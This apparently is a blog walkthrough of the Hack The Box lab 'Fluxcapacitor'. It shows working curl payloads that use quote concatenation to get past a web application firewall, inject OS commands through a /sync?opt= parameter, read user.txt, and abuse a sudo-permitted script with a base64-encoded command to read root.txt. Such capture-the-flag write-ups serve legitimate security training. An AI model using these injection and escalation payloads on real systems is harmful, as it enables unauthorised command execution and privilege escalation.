<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
            <h1 class="post-title entry-title">Hack the Box Challenge: Fluxcapacitor Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-challenge-fluxcapacitor-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2018-05-18T07:42:45+00:00">May 18, 2018</time><time class="updated" datetime="2025-07-05T18:08:05+00:00">July 5, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today we are sharing our experience that can be helpful in solving new CTF challenge: Fluxcapacitor of Hack The Box. Solving this lab is not much easy, all you need is your web penetration testing skills to solve this challenge. This lab is designed to bypass the Web Application Firewall (WAF) for exploiting OS command injection vulnerability in this machine.</span></p>
<p><span style="color: #000000;"><strong>Level: Medium</strong></span></p>
<p><span style="color: #000000;"><strong>Task:</strong> Find the user.txt and root.txt in the vulnerable Lab.</span></p>
<h3><span style="color: #800000;"><strong>Penetration Methodology</strong></span></h3>
<ul>
<li><span style="color: #000000;">Network Scanning</span></li>
<li><span style="color: #000000;">Enumeration</span></li>
<li><span style="color: #000000;">Exploiting  </span></li>
<li><span style="color: #000000;">Privilege Escalation</span></li>
<li><span style="color: #000000;">Capture root.txt file</span></li>
</ul>
<p><span style="color: #000000;"><strong>Let’s Begin!!</strong></span></p>
<h3><span style="color: #800000;">Network Scanning</span></h3>
<p><span style="color: #000000;">These labs are only available online, therefore, they have a static IP. Fluxcapacitor has IP: 10.10.10.69.</span></p>
<p><span style="color: #000000;">As we knew, the initial stage is enumeration; therefore, use the nmap version scan to collect information about the target machine and running services.</span></p>
<pre class="lang:default decode:true">nmap -sV 10.10.10.69</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-eqUJgoM32R4/Wv5vZBoeqeI/AAAAAAAAW6A/MqFwal3retw8gERHBBJmwrkBjcxHfEmnACLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">From its scanning result, it tells us that port 80 is open to web services and is also protected by the “superWAF” web application firewall, so we explored the target IP in the web browser but found nothing interesting.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-Y6ouGmKAJKI/Wv5vazas5dI/AAAAAAAAW6g/QjWZqhs1S-8OnsL0Ia9Xp_HIi34wmkAeACLcBGAs/s1600/2.png"/></span></p>
<h3><span style="color: #800000;">Enumeration</span></h3>
<p><span style="color: #000000;">Then we looked into its source code and saw an exciting comment pointing to URL: /sync, and without wasting time, we opened /sync in URL.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-hhe3DUbK_Ic/Wv5vaweZR_I/AAAAAAAAW6k/74KR5zRGfTUZf-awViESI9qz4f7VwADswCLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;">LOL!!! It gave 403 forbidden error message and something <strong>openresty/1.13.6.1</strong> then we looked at Google for any exploit related to it, but could not find any working exploit against it.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-msjofHTgyXA/Wv5vbVOzkEI/AAAAAAAAW6o/XEj937vCa88VngY_geWGREswBNaT_--gwCLcBGAs/s1600/4.png"/></span></p>
<p>A<span style="color: #000000;">t the moment, we decided to use burp suite to intercept our browser request. After intercepting the HTTP request, the raw information is sent to the repeater.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-5MlLEnG7A2k/Wv5vbRmxE9I/AAAAAAAAW6s/oHCRwiTb9I4kMR0SyXb3wSO7X0Yb4O9vgCLcBGAs/s1600/5.png"/></span></p>
<p><span style="color: #000000;">Yeah!! It was the same output as in the web browser. There might be some chances of WAF filter restriction on user agents such as Mozilla Firefox/5.0.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-hjTCV47-BKw/Wv5vbshJ8mI/AAAAAAAAW6w/_voA7vQWJo4pRurJPbXJ29Tf05ag33cQwCLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;">So we start scrutiny for the User- Agent field by randomly replacing the original user- agent content from “raj.” Finally!!! It gave the current timestamp as disclosed in the comment found in the home page source code.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-IViC61XXMHA/Wv5vb_LdOFI/AAAAAAAAW60/0kKzYBTotE8u-Sb9_nYlIhN9u3gSXvx9wCLcBGAs/s1600/7.png"/></span></p>
<p><span style="color: #000000;">Now it was confirmed that there was a SuperWAF filter against the user agent field, so we tried to search for its exploit in Google, but we didn’t find any particular exploit.  Nevertheless, Google gave a little hint for OS command injection and on the basis of that, we try a few parameters in the HTTP- header, such as <strong>/sync?test= ls</strong>, which answer each time with the same timestamp. Therefore, we need to fuzz the proper directory, so we will use wfuzz in our next step.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-aHyFvw7Dlt4/Wv5vcHxQcPI/AAAAAAAAW64/4Axisr2Ve_EiIAETD_SfIw77wfwBk_dYwCLcBGAs/s1600/8.png"/></span></p>
<h3><span style="color: #800000;">Exploiting</span></h3>
<p><span style="color: #000000;">So we use common.txt wordlist for URL brute force and will execute below command.</span></p>
<pre class="lang:default decode:true ">wfuzz -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.69/sync?FUZZ=ls -c --hh 19
</pre>
<p><span style="color: #000000;">It gave 403 response for payload “opt”; let’s try to opt after/sync and identify the response.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-RrORjCSAiiE/Wv5vZDydXwI/AAAAAAAAW6E/4OlQ3bq7ef4SJy4T1RKgVVt2Ta-H3Iv_gCLcBGAs/s1600/10.png"/></span></p>
<p><span style="color: #000000;">Now use the’ opt’ parameter to bypass WAF and execute ls command through it, HOWEVER again, there is a trick to execute ls command. Because WAF won’t allow you to execute OS command injection directly, it will be a little harder to exploit it. But THANKS to <span style="color: #3366ff;"><a style="color: #3366ff;" href="https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0"><strong>medium.com</strong></a></span>, because I have the idea of bypassing WAF to exploit OS command injection known as string literal concatenation from this website, it means that adjacent string literals are concatenated, without any operator.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-C5sl4Tj6ukk/Wv5vaJ515iI/AAAAAAAAW6Q/Gj4hayaKcYUKfY30ZjikJpb8LEzENqjIQCLcBGAs/s1600/11.png"/></span></p>
<p><span style="color: #000000;">We took help from the website I mentioned above and executed three commands: whoami, id, uname through curl as shown in the image.</span></p>
<pre class="lang:default decode:true ">curl "http://10.10.10.69/sync?opt=' whoami'"
curl "http://10.10.10.69/sync?opt=' id'"
curl "http://10.10.10.69/sync?opt=' u'n'ame -a'"</pre>
<p><span style="color: #000000;">Superb!! It was great to know that we have successfully bypassed WAF, but the task is still not finished.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-Civ7AKNPmmA/Wv5vZk5J5_I/AAAAAAAAW6I/kzFdnZmi9W8e2nJ55oiUK6dH7_2FxtliwCLcBGAs/s1600/12.png"/></span></p>
<p><span style="color: #000000;">Let’s seize the user.txt and root.txt file and finish this task. Hhhhhh!!!! Believe me, it’s still not easy to bypass WAF even if your goal is near. </span></p>
<p><span style="color: #000000;">Seriously, we put a lot of effort and finally found user.txt when we executed the commands below:</span></p>
<pre class="lang:default decode:true">curl "http://10.10.10.69/sync?opt=' l's' /home'"
curl "http://10.10.10.69/sync?opt=' l's' /home/Fl'uxC'apa'cit'orI'n'c'"
curl "http://10.10.10.69/sync?opt=' c'at' /home/Fl'uxC'apa'cit'orI'n'c/u'ser'.'txt''"</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-1mEST3TtIOg/Wv5vZsZnzDI/AAAAAAAAW6M/oDYrCJhBuSQgiOSlSxaxocRdcLW5r1yCACLcBGAs/s1600/13.png"/></span></p>
<h3><span style="color: #800000;">Privilege Escalation</span></h3>
<p><span style="color: #000000;">Now the goal was root.txt and taking a lesson from the previous experience, I chose to run the sudo -l command to check the sudo privileges of the current user.</span></p>
<pre class="lang:default decode:true">curl "http://10.10.10.69/sync?opt=' sudo -l'"</pre>
<p><span style="color: #000000;"><strong><img decoding="async" src="https://2.bp.blogspot.com/-1C0bKtXYaXU/Wv5vaHDL7TI/AAAAAAAAW6U/Utcwz525I-wZsaO37-d22Rlqm9fTEv1JgCLcBGAs/s1600/14.png"/></strong></span></p>
<p><span style="color: #000000;">Awesome!! It told us that we can run a “monit” script with root privileges without using a password inside the /home/themiddle/directory. </span></p>
<p><span style="color: #000000;">Let’s open it with the help of the cat command as done here:</span></p>
<pre class="lang:default decode:true">curl "http://10.10.10.69/sync?opt=' c'at' /h'ome/themiddle/.monit''"</pre>
<p><span style="color: #000000;">After reading the .monit file, we concluded that the script takes two parameters i.e. cmd string and base64 decoding which will match the conditions according to it and passes the final result to bash -c as the parameter.</span></p>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://4.bp.blogspot.com/-lROZ-_g5GsY/Wv5vaFvPXzI/AAAAAAAAW6Y/gTkwzvMdYoAj7GYfE97WtpB5SceyGNb1gCLcBGAs/s1600/15.png"/></strong></span></p>
<p><span style="color: #000000;">It was therefore clear that the first parameter will match the string “cmd” and the second will decode the base64 value, which is why we first generated the base64 value for /root/root.txt because we were well aware of the location of the root.txt file from our previous challenges.</span></p>
<pre class="lang:default decode:true">echo "cat /root/root.txt" | base64</pre>
<p><span style="color: #000000;">Now with the help of sudo privilege, execute the command to gain root access and complete the task by grabbing root.txt</span></p>
<pre class="lang:default decode:true ">curl "http://10.10.10.69/sync?opt=' sudo /h'ome/themiddle/.monit' cmd Y2F0IC9yb290L3Jvb3QudHh0Cg=='"</pre>
<p><span style="color: #000000;">HURRAYYYY!!! We reached the goal and successfully found the root.txt file.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-35uLOmRyVy8/Wv5vai6H7cI/AAAAAAAAW6c/8iurWmDLAjkqTVPt6tki-nW2rSp5OqMBQCLcBGAs/s1600/16.png"/></span></p>
<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
<p><span style="color: #000000;"><strong>Author: </strong>AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
